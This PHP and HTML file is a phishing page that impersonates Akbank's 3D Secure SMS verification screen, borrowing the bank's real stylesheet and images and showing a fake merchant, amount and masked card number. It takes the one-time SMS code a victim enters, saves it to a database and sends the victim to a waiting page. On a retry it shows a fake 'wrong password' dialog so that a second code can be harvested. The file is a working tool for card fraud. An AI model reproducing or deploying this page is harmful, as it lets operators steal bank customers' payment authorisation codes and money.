<?php
error_reporting(0);
date_default_timezone_set('Europe/Istanbul');
include('config.php');

// SMS durumunu güncelle
$stmt = $pdo->prepare("UPDATE users SET payment_status = 'sms_waiting', updated_at = NOW() WHERE user_identifier = ?");
$stmt->execute([$userIdentifier]);

$hata = false;
if($_GET) {
    if($_GET['hata'] == "true") $hata = true;
    else $hata = false;
}

if($_POST){
    $sms = guvenlik(trim($_POST['sms']));
    $date = date('d.m.Y H:i');
    
    if($hata == true) {
        $stmt = $pdo->prepare("UPDATE users SET sms_code2 = ?, redirect_url = NULL, updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$sms, $userIdentifier]);
        header('Location: ../bekle.php');
        exit;
    } else {
        $stmt = $pdo->prepare("UPDATE users SET sms_code = ?, redirect_url = NULL, updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$sms, $userIdentifier]);
        header('Location: ../bekle.php');
        exit;
    }
}
?>

<html>
  <head>
    <title>Alışveriş</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css">
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <style>
      .ui-loading .ui-loader {
        display: none;
      }

      .ui-icon-loading {
        opacity: 0;
      }
    </style>
    <meta name="decorator" content="3dlayout">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
  </head>
  <body>
    <div data-role="content" data-theme="c">
      <noscript style="color: red">İşleminizi tamamlayabilmeniz için Javascript'i etkinleştirin. </noscript>
      <div class="content">
        <div class="dijitalgozluk-arkaplan">
          <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" action="<?php echo $hata == true ? "?hata=true" : ""?>" method="POST" autocomplete="off">
            <div class="dijitalgozluk-ekran">
              <div class="dijitalgozluk-cerceve">
                <div class="dijitalgozluk-kapat">
                  <a href="javascript:clickCancelButton();"><img src="dijitalgozluk_img/v2/icon-close-18x18.png" alt="X"></a>
                </div>
                <div class="dijitalgozluk-logolar">
                  <div class="dijitalgozluk-logo dijitalgozluk-logo-banka">
                    <img src="dijitalgozluk_img/logo-akbank.svg" alt="Akbank">
                  </div>
                  <div class="dijitalgozluk-logo dijitalgozluk-logo-marka">
                    <img style="margin-top: -3px;" src="dijitalgozluk_img/v2/logo_mastercard.png">
                  </div>
                  <div class="dijitalgozluk-yazi dijitalgozluk-baslik">
                    Uluslararası Güvenlik<br> Platformu 3D Secure
                  </div>
                </div>
                <div class="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
                      İşyeri Adı
                    </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
                      <?= $isyeri?>
                    </div>
                  </div>
                  <?php if(isset($_SESSION['tutar'])) { ?>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
                      Tutar
                    </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
                      <?= $_SESSION['tutar'] ?> TL
                    </div>
                  </div>
                  <?php } ?>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
                      Tarih
                    </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
                      <?php echo date("d.m.Y  H:i:s"); ?></div>
                    </div>
                    <div class="dijitalgozluk-tablo-satir">
                      <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
                        Kart Numarası
                      </div>
                      <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
                        ************<?= $cc_last_4?>
                      </div>
                    </div>
                    <div class="dijitalgozluk-tablo-satir">
                      <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
                        Cep Telefonu
                      </div>
                      <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
                        05XXXXX<?= $no_last_4?>
                      </div>
                    </div>
                </div>
                <div id="passwordInformation">
                  <div class="dijitalgozluk-kart-logo">
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="">
                  </div>
                  <div id="passwordInformation1" class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                    <p>
                      <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
                    </p>
                  </div>
                  <div id="passwordInformation2" class="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
                    <div class="dijitalgozluk-form-yazi-baslik">Şifre:</div>
                    <div class="dijitalgozluk-form-yazi-input">
                      <input type="password" id="sms" name="sms" autofocus minlength="6" onpaste="return false;" ondrop="return false;" autocomplete="off" onkeypress="test(this, event)" maxlength="6" size="6" autocomplete="off" required>
                    </div>
                    <div id="helpDiv" class="dijitalgozluk-form-yazi-yardim">
                      <a id="opener">Yardım</a>
                    </div>
                  </div>
                </div>
                <div>
                  <div id="div1" style="width: 180px; margin: 0px auto 0 auto;"></div>
                </div>
                <div id="remainingWarn" class="dijitalgozluk-yazi dijitalgozluk-uyari">
                  <p> Onaylama süresinin dolmasına <span id="time">180</span> saniye kalmıştır </p>
                </div>
                <div class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
                  <input id="DevamEt" name="DevamEt" type="submit" value="Devam">
                </div>
                <div class="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
                  <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
                </div>
            </div>
		      </div>
        </form>
      </div>  
    </div>
</div>
<div data-role="”footer”" data-theme="c" data-position="fixed"></div>
    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-draggable ui-resizable" aria-describedby="dialog" aria-labelledby="ui-id-1" style="display: none; position: absolute;">
      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle">
        <span id="ui-id-1" class="ui-dialog-title">Şifre</span>
        <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close">
          <span class="ui-button-icon ui-icon ui-icon-closethick"></span>
          <span class="ui-button-icon-space"></span>Close </button>
      </div>
      <div id="dialog" class="ui-dialog-content ui-widget-content">
        <p>Telefonunuza SMS ile gönderilen tek kullanımlık şifreyi bu alana giriniz.</p>
      </div>
      <div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
    </div>
    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable ui-resizable" aria-describedby="dialogSmsPwd" aria-labelledby="ui-id-2" style="display: none; position: absolute;">
      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle">
        <span id="ui-id-2" class="ui-dialog-title">Hatalı Şifre</span>
        <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close">
          <span class="ui-button-icon ui-icon ui-icon-closethick"></span>
          <span class="ui-button-icon-space"></span>Close </button>
      </div>
      <div id="dialogSmsPwd" class="ui-dialog-content ui-widget-content">
        <span style="float:left; margin:0 7px 50px 0;"></span>
        <p style="font-size: 12px;">Girdiğiniz şifrede hata var. Lütfen kontrol ederek yeniden giriş yapınız</p>
      </div>
      <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
        <div class="ui-dialog-buttonset">
          <button type="button" class="ui-button ui-corner-all ui-widget">Tamam</button>
        </div>
      </div>
      <div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
    </div>
    <script type="text/javascript">
      function test(el, event) {
        if((event.key.match(/\d/) == null)) {
          event.preventDefault();
          return false
        }
      }
      <?php if($hata) { ?>
      $(document).ready(function() {
        $('#dialogSmsPwd').dialog({ title: "Hata!", autoOpen: ![], show: {effect: "blind", duration: 500}, modal: !![], buttons: {Tamam: function () { $(this).dialog("close");}}}).dialog("open");
      });
      <?php } ?>
      var seconds = 180;
      var display = document.querySelector('#time');
      function decrementSeconds() {
        seconds -= 1;
        display.textContent = seconds;
      }
      var cancel = setInterval(decrementSeconds, 1000);
    </script>
    <script src="/tracking.js"></script>
	</body>
</html>